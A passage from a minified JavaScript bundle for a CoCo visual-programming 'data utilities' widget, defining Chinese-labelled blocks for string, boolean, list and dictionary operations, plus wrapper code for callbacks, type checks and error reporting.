dn("字符串")},"匹配",{key:"pattern",label:"模式",type:new dn("^字.*串$")},{key:"flags",label:"标记",type:new dn("g")}],returns:new kn({itemType:new dn})},Lo={string__match(e,t,n){const r=e.match(new RegExp(t,n));return null!=r?r:[]}},Do={label:"字符串",blockOptions:{color:x.GREEN},contents:[{contents:[bo,go,_o]},{contents:[To,Vo]},{contents:[Oo,Eo]},{contents:[Po,No,xo]},{contents:[Ro]}]},Bo=Object.assign({},ho,wo,mo,So,jo,Co,$o,Mo,Ao,Io,Lo);function me(e){return e.every(({boolean:e})=>e)}function ke(e,t){if(!e)return!1;for(const{boolean:e}of t)if(!e)return!1;return!0}const Wo={key:"boolean__andInline_v2",label:"布尔且",block:[{key:"booleans",label:"布尔值",type:new Sn({block:[{key:"boolean",label:"布尔值",type:new gn(!0)}],separators:["且"],min:2,transformMax:5})}],returns:new gn},Fo={boolean__andInline_v2:me},Ho={key:"boolean__andInline",label:"布尔且 v1",block:["v1",{key:"firstBoolean",label:"首个布尔值",type:new gn(!0)},{key:"booleans",label:"布尔值",type:new Sn({block:["且",{key:"boolean",label:"布尔值",type:new gn(!0)}],min:1,transformMax:4})}],returns:new gn},qo={boolean__andInline:ke},Uo={key:"boolean__andMultiline_v2",label:"布尔且",block:[{key:"booleans",label:"布尔值",type:new Sn({block:[{key:"boolean",label:"布尔值",type:new gn(!0)}],separators:[A.BREAK_LINE,"且"],min:2,transformMax:5})}],returns:new gn,blockOptions:{inline:!1}},Jo={boolean__andMultiline_v2:me},Go={key:"boolean__andMultiline",label:"v1",block:[{key:"firstBoolean",label:"",type:new gn(!0)},{key:"booleans",label:"布尔值",type:new Sn({block:[{key:"boolean",label:"且",type:new gn(!0)}],min:1,transformMax:4})}],returns:new gn,blockOptions:{inline:!1}},Xo={boolean__andMultiline:ke};function Te(e){return e.some(({boolean:e})=>e)}function Se(e,t){if(e)return!0;for(const{boolean:e}of t)if(e)return!0;return!1}const Yo={key:"boolean__orInline_v2",label:"布尔或",block:[{key:"booleans",label:"布尔值",type:new Sn({block:[{key:"boolean",label:"布尔值",type:new gn(!0)}],separators:["或"],min:2,transformMax:5})}],returns:new gn},Ko={boolean__orInline_v2:Te},Zo={key:"boolean__orInline",label:"布尔或 v1",block:["v1",{key:"firstBoolean",label:"首个布尔值",type:new gn(!0)},{key:"booleans",label:"布尔值",type:new Sn({block:["或",{key:"boolean",label:"布尔值",type:new gn(!0)}],min:1,transformMax:4})}],returns:new gn},zo={boolean__orInline:Se},Qo={key:"boolean__orMultiline_v2",label:"布尔或",block:[{key:"booleans",label:"布尔值",type:new Sn({block:[{key:"boolean",label:"布尔值",type:new gn(!0)}],separators:[A.BREAK_LINE,"或"],min:2,transformMax:5})}],returns:new gn,blockOptions:{inline:!1}},el={boolean__orMultiline_v2:Te},tl={key:"boolean__orMultiline",label:"v1",block:[{key:"firstBoolean",label:"",type:new gn(!0)},{key:"booleans",label:"布尔值",type:new Sn({block:[{key:"boolean",label:"或",type:new gn(!0)}],min:1,transformMax:4})}],returns:new gn,blockOptions:{inline:!1}},nl={boolean__orMultiline:Se},rl={label:"布尔",blockOptions:{color:x.BROWN},contents:[{contents:[Ho,Wo,Uo,Go,Yo,Zo,Qo,tl]}]},ol=Object.assign({},qo,Fo,Jo,Xo,Ko,zo,el,nl);function Ve(e){return e.map(({value:e})=>e)}const ll={key:"array__literalInline",label:"列表单行字面",block:["列表",{key:"items",label:"项",type:new Sn({block:[{key:"value",label:"值",type:new Bn("项")}],min:0})}],returns:new kn},al={array__literalInline:Ve},il={key:"array__literalMultiline",label:"列表字面多行",block:["列表",{key:"items",label:"项",type:new Sn({block:[A.BREAK_LINE,{key:"value",label:"值",type:new Bn("项")}],min:0,transformMin:2,transformMax:5})}],returns:new kn,blockOptions:{inline:!1}},sl={array__literalMultiline:Ve},ul={key:"array__item",label:"列表项",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},{key:"indexType",label:"索引类型",type:ko},"第",{key:"index",label:"索引",type:new Ln(1)},"项"],returns:new Bn},cl={array__item:(e,t,n)=>e[_e(n,t,e.length)]},pl={key:"array__find",label:"列表查找",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},"第一个满足",{key:"condition",label:"条件",type:new mn({block:[{key:"item",label:"项",type:new Bn},{key:"index",label:"索引",type:new Ln},{key:"array",label:"列表",type:new kn}],returns:new gn(!0)})},"的项"],returns:new Bn},yl={array__find(e,t){const n=[];for(const r in e){const o=t(e[r],Number(r)+1,e);if("boolean"==typeof o){if(o)return e[r]}else n[r]=o}if(0!=n.length)return new Promise(t=>{Promise.all(n.map(async(n,r)=>{await n&&t(e[r])})).then(()=>{t(void 0)})})}},fl={key:"array__indexOf",label:"列表位置",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},{key:"type",label:"类型",type:new wn([["第一个","First"],["最后一个","Last"]])},{key:"item",label:"项",type:new Bn("项")},"的位置"],returns:new Ln},bl={array__indexOf(e,t,n){switch(t){case"First":return e.indexOf(n)+1;case"Last":return e.lastIndexOf(n)+1}}},dl={key:"array__findIndex",label:"列表查找位置",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},"第一个满足",{key:"condition",label:"条件",type:new mn({block:[{key:"item",label:"项",type:new Bn},{key:"index",label:"索引",type:new hn},{key:"array",label:"列表",type:new kn}],returns:new gn(!0)})},"的项的位置"],returns:new Ln},hl={array__findIndex(e,t){const n=[];for(const r in e){const o=t(e[r],Number(r)+1,e);if("boolean"==typeof o){if(o)return Number(r)+1}else n[r]=o}return 0==n.length?0:(async()=>{for(const e in n)if(await n[e])return Number(e)+1;return 0})()}},gl={key:"array__some",label:"列表存在满足",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},"存在满足",{key:"condition",label:"条件",type:new mn({block:[{key:"item",label:"项",type:new Bn},{key:"index",label:"索引",type:new Ln},{key:"array",label:"列表",type:new kn}],returns:new gn(!0)})},"的项"],returns:new gn},wl={array__some(e,t){const n=[];for(const r in e){const o=t(e[r],Number(r)+1,e);if("boolean"==typeof o){if(o)return!0}else n.push(o)}return 0!=n.length&&new Promise(e=>{Promise.all(n.map(async t=>{await t&&e(!0)})).then(()=>{e(!1)})})}},vl={key:"array__every",label:"列表全部满足",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},"全部项满足",{key:"condition",label:"条件",type:new mn({block:[{key:"item",label:"项",type:new Bn},{key:"index",label:"索引",type:new Ln},{key:"array",label:"列表",type:new kn}],returns:new gn(!0)})}],returns:new gn},_l={array__every(e,t){const n=[];for(const r in e){const o=t(e[r],Number(r)+1,e);if("boolean"==typeof o){if(!o)return!1}else n.push(o)}return 0==n.length||new Promise(e=>{Promise.all(n.map(async t=>{await t||e(!1)})).then(()=>{e(!0)})})}},ml={key:"array__sortWith",label:"列表自定义排序",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},"按",{key:"comparer",label:"比较器",type:new mn({block:[{key:"x",label:"X",type:new Bn},{key:"y",label:"Y",type:new Bn}],returns:new gn(!0)})},"排列"],tooltip:"按照自定义的顺序重新排列列表中的元素。与 列表排序 方法不同的是，该方法接收一个自定义比较器来定制比较方法。\n比较器：该函数接收两个参数 X 和 Y，如果 X 应该排在 Y 前面，则应该返回 真，反之则应该返回 假，如果 X 和 Y 相同，返回 真 或 假 都可以。"};async function je(e,t,n,r){if(n-t<=1)return;const o=Math.floor((t+n)/2);await je(e,t,o,r),await je(e,o,n,r),await async function(e,t,n,r,o){const l=e.slice(t,n),a=e.slice(n,r);let i=0,s=0,u=t;for(;i<l.length&&s<a.length;)await o(l[i],a[s])||!await o(a[s],l[i])?(e[u]=l[i],i++):(e[u]=a[s],s++),u++;for(;i<l.length;)e[u]=l[i],i++,u++;for(;s<a.length;)e[u]=a[s],s++,u++}(e,t,o,n,r)}const kl={array__sortWith:(e,t)=>je(e,0,e.length,t)},Tl={key:"array__sort",label:"列表排序",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},"按",{key:"order",label:"顺序",type:new wn([["升序","Ascending"],["降序","Descending"]])},"排列"],tooltip:"按照一定的顺序重新排列列表中的元素。"};function Oe(e,t){return"number"==typeof e&&"number"==typeof t&&e<t}function Ce(e,t){return"number"==typeof e&&"number"==typeof t&&e>t}const Sl={array__sort(e,t){switch(t){case"Ascending":return je(e,0,e.length,Oe);case"Descending":return je(e,0,e.length,Ce)}}},Vl={key:"array__slice",label:"列表截取",block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})},{key:"startIndexType",label:"起始位置",type:ko},"第",{key:"startIndex",label:"索引",type:new Ln(1)},"到",{key:"endIndexType",label:"结束位置",type:ko},"第",{key:"endIndex",label:"索引",type:new Ln(1)},"项"],returns:new kn},jl={array__slice:(e,t,n,r,o)=>e.slice(_e(n,t,e.length),_e(o,r,e.length)+1)},Ol=require("lodash");var Ee=e.n(Ol);const Cl={key:"array__flatten",label:"列表拉平",block:["拉平",{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})}],returns:new kn,tooltip:"将嵌套的列表拉平成一个一维列表。"},El={array__flatten:e=>Ee().flattenDeep(e)};function $e(e){let t=[];for(const{array:n}of e)t=t.concat(n);return t}const $l={key:"array__concatInline",label:"列表拼接单行",block:["拼接",{key:"arrays",label:"列表",type:new Sn({block:[{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})}],min:2,transformMax:5})}],returns:new kn},Pl={array__concatInline:$e},Ml={key:"array__concatMultiline",label:"列表拼接多行",block:["拼接",{key:"arrays",label:"列表",type:new Sn({block:[A.BREAK_LINE,{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})}],min:2,transformMax:5})}],returns:new kn,blockOptions:{inline:!1}},Nl={array__concatMultiline:$e},Al={key:"array__map",label:"列表映射",block:["按",{key:"mapper",label:"映射器",type:new mn({block:[{key:"item",label:"项",type:new Bn},{key:"index",label:"索引",type:new Ln},{key:"array",label:"列表",type:new kn}],returns:new Bn})},"映射",{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})}],returns:new kn},xl={array__map(e,t){const n=[],r=[];for(const o in t){const l=e(t[o],Number(o)+1,t);l instanceof Promise?n[o]=l:r[o]=l}return 0==n.length?r:(async()=>{for(const e in n)r[e]=await n[e];return r})()}},Il={key:"array__filter",label:"列表过滤",block:["按",{key:"condition",label:"条件",type:new mn({block:[{key:"item",label:"项",type:new Bn},{key:"index",label:"索引",type:new Ln},{key:"array",label:"列表",type:new kn}],returns:new gn(!0)})},"过滤",{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})}],returns:new kn},Rl={async array__filter(e,t){const n=[];for(const r in t)n[r]=e(t[r],Number(r)+1,t);const r=[];for(const e in t){await n[e]&&r.push(t[e])}return r}},Ll={key:"array__join",label:"列表连接",block:["用",{key:"separator",label:"分隔符",type:new dn(",")},"连接",{key:"array",label:"列表",type:new kn({itemType:new Bn,defaultValue:["列表"]})}],returns:new dn},Dl={array__join:(e,t)=>t.join(e)},Bl={label:"列表",blockOptions:{color:x.YELLOW},contents:[{contents:[ll,il]},{contents:[ul,pl]},{contents:[fl,dl]},{contents:[gl,vl]},{contents:[Tl,ml]},{contents:[Vl,Cl,$l,Ml,Al,Il]},{contents:[Ll]}]},Wl=Object.assign({},al,sl,cl,yl,bl,hl,wl,_l,Sl,kl,jl,El,Pl,Nl,xl,Rl,Dl);function Pe(e){const t={};for(const{key:n,value:r}of e)"string"==typeof n&&(t[n]=r);return t}const Fl={key:"object__literalInline",label:"字典字面单行",block:["字典",{key:"entries",label:"项",type:new Sn({block:[{key:"key",label:"键",type:new Bn("键")},":",{key:"value",label:"值",type:new Bn("值")}],separators:[","],min:0,transformMax:5})}],returns:new Tn},Hl={object__literalInline:Pe},ql={key:"object__literalMultiline",label:"字典",block:["字典",{key:"entries",label:"项",type:new Sn({block:[A.BREAK_LINE,{key:"key",label:"键",type:new Bn("键")},":",{key:"value",label:"值",type:new Bn("值")}],min:0,transformMin:2,transformMax:5})}],returns:new Tn,blockOptions:{inline:!1}},Ul={object__literalMultiline:Pe},Jl={key:"object__fromEntries",label:"字典从键值对",block:["字典从",{key:"entries",label:"键值对",type:new kn({itemType:new kn({itemType:new Bn}),defaultValue:[["键1","值1"],["键2","值2"]]})}],returns:new Tn},Gl={object__fromEntries(e){const t={};for(const n of e){if(2!=n.length)throw new Error("键值对项必须是长度为 2 的列表");const[e,r]=n;if("string"!=typeof e)throw new Error("字典的键必须是字符串");t[e]=r}return t}},Xl=["路径",{key:"path",label:"路径",type:new Wn(new dn("字典.路径"),new kn({itemType:new dn}))}];function Me(e){return"string"==typeof e?e.split("."):e}const Yl={key:"object__get",label:"字典获取",block:["获取",{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})},...Xl,"的值"],returns:new Bn},Kl={object__get(e,t){const n=Me(t);let r=e;for(const e of n){if(null==r||"object"!=typeof r)throw new Error("路径不存在");if(r=r[e],null==r)throw new Error("路径不存在")}return r}},Zl={key:"object__optionalGet",label:"字典可选获取",block:["可选获取",{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})},...Xl,"的值"],returns:new Bn},zl={object__optionalGet(e,t){const n=Me(t);let r=e;for(const e of n){if(null==r||"object"!=typeof r)return;if(r=r[e],null==r)return}return r}},Ql={key:"object__has",label:"字典存在",block:[{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})},"存在",...Xl],returns:new gn},ea={object__has(e,t){const n=Me(t);let r=e;for(const e of n){if(null==r||"object"!=typeof r)return!1;if(!(e in r))return!1;r=r[e]}return!0}},ta={key:"object__set",label:"字典设置",block:["设置",{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})},...Xl,"的值为",{key:"value",label:"值",type:new Bn("值")}]},na={object__set(e,t,n){const r=Me(t),o=r.pop();if(null==o)return;let l=e;for(const e of r){if(null==l||"object"!=typeof l)throw new Error("路径不存在");l=l[e]}if(null==l||"object"!=typeof l)throw new Error("路径不存在");l[o]=n}},ra={key:"object__change",label:"字典增减",block:["使",{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:0}}})},...Xl,"的值",{key:"type",label:"类型",type:new wn([["增加","Increase"],["减少","Decrease"]])},{key:"value",label:"值",type:new hn(1)}]},oa={object__change(e,t,n,r){const o=Me(t),l=o.pop();if(null==l)return;let a=e;for(const e of o){if(null==a||"object"!=typeof a)throw new Error("路径不存在");a=a[e]}if(null==a||"object"!=typeof a)throw new Error("路径不存在");const i=a[l];switch(n){case"Increase":a[l]=i+r;break;case"Decrease":a[l]=i-r}}};function Ne(e){return Object.assign({},...e.map(({object:e})=>e))}const la={key:"object__mergeInline_v1",label:"字典合并单行",block:["合并",{key:"objects",label:"字典",type:new Sn({block:[{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})}],min:2,transformMax:5})}],returns:new Tn},aa={object__mergeInline_v1:Ne},ia={key:"object__mergeMultiline_v1",label:"字典合并多行",block:["合并",{key:"objects",label:"字典",type:new Sn({block:[A.BREAK_LINE,{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})}],min:2,transformMax:5})}],returns:new Tn,blockOptions:{inline:!1}},sa={object__mergeMultiline_v1:Ne},ua={key:"object__array",label:"字典数组",block:[{key:"object",label:"字典",type:new Tn({defaultValue:{字典:{路径:"值"}}})},"的",{key:"type",label:"类型",type:new wn([["键","Keys"],["值","Values"],["键值对","Entries"]])},"列表"],returns:new kn({itemType:new Bn})},ca={object__array(e,t){switch(t){case"Keys":return Object.keys(e);case"Values":return Object.values(e);case"Entries":return Object.entries(e);default:return[]}}},pa={label:"字典",blockOptions:{color:x.PURPLE},contents:[{contents:[Fl,ql,Jl]},{contents:[Yl,Zl]},{contents:[Ql]},{contents:[ta,ra]},{contents:[la,ia]},{contents:[ua]}]},ya=Object.assign({},Hl,Ul,Gl,Kl,zl,ea,na,oa,aa,sa,ca),fa={label:"数据",contents:[Wr,yo,Do,rl,Bl,pa]},ba=e.g.Object.assign({},Fr,fo,Bo,ol,Wl,ya);const da={type:"SLIGHTNING_DATA_UTILS_WIDGET",info:{title:"数据工具",icon:"https://creation.bcmcdn.com/716/appcraft/IMAGE_4sf_5p-l3_1749192384667.svg",category:"数据",version:Un.rE,url:{homepage:"https://gitee.com/slightning/coco-data-utils-widget",docs:"https://gitee.com/slightning/coco-data-utils-widget",repository:"https://gitee.com/slightning/coco-data-utils-widget",bugReport:"https://gitee.com/slightning/coco-data-utils-widget/issues/new"}},options:{visible:!1,global:!0},properties:[],methods:[{...fa,label:null}],events:[]};class ha extends(be(da)){}e.g.Object.assign(ha.prototype,ba),function(e,t,r){n().exportWidget(function(e){return Object.assign(Object.assign({},e),{properties:I(e.properties),methods:[...e.events.map(D),{space:40},...R(e.methods)],events:[]})}(e),t,r)}(da,ha,{decorators:[function(e,t){const n={label:"旧版",contents:[]};return q(e,{MethodTypes(e){const{value:t}=e;/v[0-9]+$/.test(t.label)&&(null==t.tooltip?t.tooltip="该方法是旧版本的方法，出于兼容性考虑而被保留，请不要使用！":t.tooltip=`该方法是旧版本的方法，出于兼容性考虑而被保留，请不要使用！\n\n${t.tooltip}`,t.blockOptions={...e.blockOptions,...t.blockOptions},e.remove(),n.contents.push(t))}}),e.methods.push(n),[e,t]},{CoCo:function(e,t){return[e,t]=function(e,t){return q(e,{MethodTypes(e){if(!e.value.block.some(K))return;const n=[],r=Object.assign(Object.assign({},e.value),{key:`__slightning_coco_widget_transformed_callback_function_to_events__${e.value.key}`,block:[...e.value.block]});for(let o=0;o<r.block.length;o++){const l=r.block[o];if(null==l)continue;if("object"!=typeof l)continue;if(!K(l)){n.push(e=>e);continue}const a=`${r.key}${S(l.key)}`,i=`${r.label}·${l.label}`,s=l.type;class u{constructor(){this.name="解决函数引用"}}class c{constructor(){this.name="拒绝函数引用"}}const p=new WeakMap,y=new WeakMap,f=new Tn({propertiesType:{state:new wn([["未完成","undone"],["已解决","resolved"],["已拒绝","rejected"]]),resolve:new Fn({theClass:u}),reject:new Fn({theClass:c})},defaultValue:i}),b=[{key:"__slightning_coco_widget_call_data__",label:l.label,type:f},{key:"__slightning_coco_widget_call_context__",label:"上下文",type:new Bn}];for(const e of s.block)"object"==typeof e&&b.push({key:e.key,label:e.label,type:e.type});r.block.splice(o,1,l.label,"（上下文",{key:`__slightning_coco_widget_call_context__${l.key}`,label:`${l.label}（上下文）`,type:new Bn({defaultValue:`${l.label}上下文`})},"）"),o++,n.push(function(e){const t=this;return function(...n){let r=null,o=null;const l=new u,i=new c;p.set(l,function(e){"undone"==s.state&&(s.state="resolved",s.value=e,null==r||r(e))}),y.set(i,function(e){"undone"==s.state&&(s.state="rejected",s.value=e,null==o||o(e))});const s={state:"undone",resolve:l,reject:i};if(Q.call(t,a,s,e,...n),"resolved"==s.state)return s.value;if("rejected"==s.state)throw s.value;return new Promise((e,t)=>{r=e,o=t})}}),null==s.throws||s.throws.isVoid()||(e.insertAfter({space:8},{type:vn.METHOD,key:`__slightning_coco_widget_throw__${a}`,label:`${i}抛出`,block:[{key:"__slightning_coco_widget_call_data__",label:i,type:f},"抛出",{key:"exception",label:"异常",type:s.throws}],returns:new _n,blockOptions:Object.assign(Object.assign({},r.blockOptions),{inline:!0})}),Object.defineProperty(t.prototype,`__slightning_coco_widget_throw__${a}`,{value:function(e,t){const n=y.get(e.reject);if(null==n)throw new Error("拒绝函数不存在");n(t)},writable:!0,enumerable:!1,configurable:!0})),null!=s.returns&&(e.insertAfter({space:8},{type:vn.METHOD,key:`__slightning_coco_widget_return__${a}`,label:`${i}返回`,block:[{key:"__slightning_coco_widget_call_data__",label:i,type:f},"返回",...s.returns.isVoid()?[]:[{key:"returnValue",label:"返回值",type:s.returns}]],returns:new _n,blockOptions:Object.assign(Object.assign({},r.blockOptions),{inline:!0})}),Object.defineProperty(t.prototype,`__slightning_coco_widget_return__${a}`,{value:function(e,t){const n=p.get(e.resolve);if(null==n)throw new Error("解决函数不存在");n(t)},writable:!0,enumerable:!1,configurable:!0})),e.insertAfter({type:vn.EVENT,key:a,label:`${i}被调用`,params:b})}Object.defineProperty(t.prototype,r.key,{value:function(...t){var r;const o=[];for(let e=0;e<t.length;e++)o.push(null===(r=n[e])||void 0===r?void 0:r.call(this,t[e]));return this[e.value.key].apply(this,o)},writable:!0,enumerable:!1,configurable:!0}),e.insertAfter(r)}}),[e,t]}(e,t),q(e,{MethodTypes(e){e.value.block.some(K)&&e.remove()}}),[e,t]},CreationProject:function(e,t){return[e,t]=function(e,t){return q(e,{MethodTypes(e){if(!e.value.block.some(Z))return;let n=[];const r=Object.assign(Object.assign({},e.value),{key:`__slightning_coco_widget_transformed_callback_function_to_code_blocks__${e.value.key}`,block:[...e.value.block]});for(let o=0;o<r.block.length;o++){const l=r.block[o];if(null==l)continue;if("object"!=typeof l)continue;if(!Z(l)){n.push(e=>e);continue}const a=`${r.key}${S(l.key)}`,i=`${r.label}·${l.label}`,s=l.type,u=new mn({block:s.block,defaultValue:s.defaultValue});r.block[o]={key:`__slightning_coco_widget_transformed_callback_function_to_code_blocks__${l.key}`,label:l.label,type:u};class c{constructor(){this.name="解决函数引用"}}class p{constructor(){this.name="拒绝函数引用"}}const y=new WeakMap,f=new WeakMap,b=new Tn({propertiesType:{state:new wn([["未完成","undone"],["已解决","resolved"],["已拒绝","rejected"]]),resolve:new Fn({theClass:c}),reject:new Fn({theClass:p})},defaultValue:i});u.block.unshift({key:"__slightning_coco_widget_call_data__",label:l.label,type:b}),n.push(function(e){return"function"!=typeof e?e:function(...t){let n=null,r=null;const o=new c,l=new p;y.set(o,function(e){"undone"==a.state&&(a.state="resolved",a.value=e,null==n||n(e))}),f.set(l,function(e){"undone"==a.state&&(a.state="rejected",a.value=e,null==r||r(e))});const a={state:"undone",resolve:o,reject:l};if(e(a,...t),"resolved"==a.state)return a.value;if("rejected"==a.state)throw a.value;return new Promise((e,t)=>{n=e,r=t})}}),null==s.throws||s.throws.isVoid()||(e.insertAfter({space:8},{type:vn.METHOD,key:`__slightning_coco_widget_throw__${a}`,label:`${i}抛出`,block:[{key:"__slightning_coco_widget_call_data__",label:i,type:b},"抛出",{key:"Exception",label:"异常",type:s.throws}],returns:new _n,blockOptions:Object.assign(Object.assign({},r.blockOptions),{inline:!0})}),Object.defineProperty(t.prototype,`__slightning_coco_widget_throw__${a}`,{value:function(e,t){const n=f.get(e.reject);if(null==n)throw new Error("拒绝函数不存在");n(t)},writable:!0,enumerable:!1,configurable:!0})),null!=s.returns&&(e.insertAfter({space:8},{type:vn.METHOD,key:`__slightning_coco_widget_return__${a}`,label:`${i}返回`,block:[{key:"__slightning_coco_widget_call_data__",label:i,type:b},"返回",...s.returns.isVoid()?[]:[{key:"returnValue",label:"返回值",type:s.returns}]],returns:new _n,blockOptions:Object.assign(Object.assign({},r.blockOptions),{inline:!0})}),Object.defineProperty(t.prototype,`__slightning_coco_widget_return__${a}`,{value:function(e,t){const n=y.get(e.resolve);if(null==n)throw new Error("解决函数不存在");n(t)},writable:!0,enumerable:!1,configurable:!0}))}Object.defineProperty(t.prototype,r.key,{value:function(...t){var r;const o=[];for(let e=0;e<t.length;e++)o.push(null===(r=n[e])||void 0===r?void 0:r.call(this,t[e]));return this[e.value.key].apply(this,o)},writable:!0,enumerable:!1,configurable:!0}),e.insertAfter(r)}}),[e,t]}(e,t),q(e,{MethodTypes(e){e.value.block.some(Z)&&e.remove()}}),[e,t]}},function(e,t){const n={};return q(e,{MethodTypes(e){n[e.value.key]={types:e.value,blockOptions:e.blockOptions}}}),[e,new Proxy(t,{construct(t,r,o){let l,a;try{l=Reflect.construct(t,r,o),a=new qn(e,l)}catch(t){l=new class extends(be(e)){constructor(r){super(r),a=new qn(e,this);const o=function(e,t){return"string"==typeof t?`${e}：${t}`:Array.isArray(t)?[e,...t]:[e,t]}("控件构造失败",t);a.error(...j(o));for(const e of Object.keys(n))this[e]=function(){throw o};e.options.visible&&(this.render=function(){throw o})}}(r[0])}return new Proxy(l,{get(t,r,o){const l=Reflect.get(t,r,o);if("string"==typeof r&&r in n){const e=n[r];let o;return o="function"==typeof l?l:r in t?function(){throw new Error(`该方法在控件实体定义中为 ${O(l)}，不是函数`)}:function(){throw new Error(`该方法（key: ${r}）在控件实体定义中不存在`)},new Proxy(o,{apply(t,n,r){var o,l;let i=null;function s(){var t;if(null==i)if(i=[],null===(t=e.blockOptions.inline)||void 0===t||t){let t=0;for(const n of e.types.block)if(n!=A.THIS)if(n!=A.METHOD)if("string"!=typeof n){if(n.type instanceof wn){const e=n.type.valueToLabelMap[r[t]];null!=e?i.push(`[${e}]`):i.push(r[t])}else"string"==typeof r[t]?i.push(JSON.stringify(r[t])):i.push(r[t]);t++}else i.push(n);else i.push(e.types.label)}else{i.push(e.types.label);let t=0;for(const n of e.types.block)if(n!=A.THIS)if(n!=A.METHOD){if("string"!=typeof n){if(n.type instanceof wn){const e=n.type.valueToLabelMap[r[t]];null!=e?i.push(`[${e}]`):i.push(r[t])}else"string"==typeof r[t]?i.push(JSON.stringify(r[t])):i.push(r[t]);t++}}else i.push(e.types.label)}return i}const u=null!==(l=null!==(o=e.types.deprecated)&&void 0!==o?o:e.blockOptions.deprecated)&&void 0!==l&&l;"string"==typeof u?a.warn(...s(),"该方法已弃用："+u):u&&a.warn(...s(),"该方法已弃用，并且可能在未来版本中移除，请尽快迁移到其他方法");const c=[];let p=0;for(const t of e.types.block)if("object"==typeof t){try{C(t.label,r[p],t.type)}catch(e){if(!(e instanceof pn))throw e;c.push(e)}p++}0!=c.length&&a.error(...s(),"类型验证失败："+c.map(e=>`\n　${e.message.split("\n").join("\n　")}`).join(""));try{const e=Reflect.apply(t,n,r);return e instanceof Promise?e.catch(e=>{a.error(...s(),"出错：",...j(e))}):e}catch(e){a.error(...s(),"出错：",...j(e))}}})}if(e.options.visible&&"render"==r){let e;return e="function"==typeof l?l:r in t?function(){throw new Error(`渲染方法在控件实体定义中为 ${O(l)}，不是函数`)}:function(){throw new Error("渲染方法在控件实体定义中不存在")},new Proxy(e,{apply(e,t,n){try{return Reflect.apply(e,t,n)}catch(e){return a.error("渲染","出错：",...j(e)),de().createElement("div",{style:{width:"100%",height:"100%",backgroundColor:"#FFFFFF80",overflow:"auto"}},de().createElement("div",{style:{width:"max-content",color:"#C00000",fontSize:"2em",fontWeight:"bold",fontFamily:"monospace"}},"渲染出错：",O(e).split("\n").map(e=>[e,de().createElement("br")])))}}})}return l}})}})]},{"CoCo|CreationProject":[function(e,t){return[e,t]=function(e,t){return q(e,{MethodTypes(e){if(!e.value.block.some(z))return;const{value:n}=e;let r=0;for(let o=0;o<n.block.length;o++){const l=n.block[o];if(null==l)continue;if(!z(l)){"object"==typeof l&&r++;continue}let a=0;for(const e of l.type.block)"object"==typeof e&&a++;const{transformMin:i,transformMax:s}=l.type;for(let u=s;u>=i;u--){const i=`__slightning_coco_widget_transform_mutator_${l.key}_${u}__${n.key}`,s=Object.assign(Object.assign({},n),{key:i,block:[...n.block]}),c=[];let p=!0;for(let e=0;e<u;e++)p?p=!1:c.push(...l.type.separators),c.push(...l.type.block.map(t=>"string"==typeof t?t:Object.assign(Object.assign({},t),{key:`__slightning_coco_widget_mutator_param_${l.key}_${e}_item__${t.key}`})));s.block.splice(o,1,...c),e.insertAfter({space:8},s),Object.defineProperty(t.prototype,i,{value:function(...e){const t=e.splice(r,u*a),o=[];for(;t.length>0;){const e={};for(const n of l.type.block)"object"==typeof n&&(e[n.key]=t.shift());o.push(e)}return e.splice(r,0,o),this[n.key](...e)},writable:!0,enumerable:!1,configurable:!0})}break}}}),[e,t]}(e,t),q(e,{MethodTypes(e){e.value.block.some(z)&&(e.remove(),e.removeNext())}}),[e,t]},function(e,t){return q(e,{MethodTypes(e){const{value:t}=e;t.block.includes(A.THIS)||(t.block.includes(A.BREAK_LINE)?t.block.unshift(A.THIS,A.BREAK_LINE):t.block.unshift(A.THIS))}}),[e,t]}]}]});var Ae=exports;for(var xe in t)Ae[xe]=t[xe];t.__esModule&&Object.defineProperty(Ae,"__esModule",{value:!0})}catch(ga){ga instanceof Error&&alert(ga.message),console.error(ga)}}.toString()+")();")(require,exports,require,exports,"undefined"==typeof InvisibleWidget?void 0:InvisibleWidget,"undefined"==typeof VisibleWidget?void 0:VisibleWidget,"undefined"==typeof widgetClass?void 0:widgetClass,React);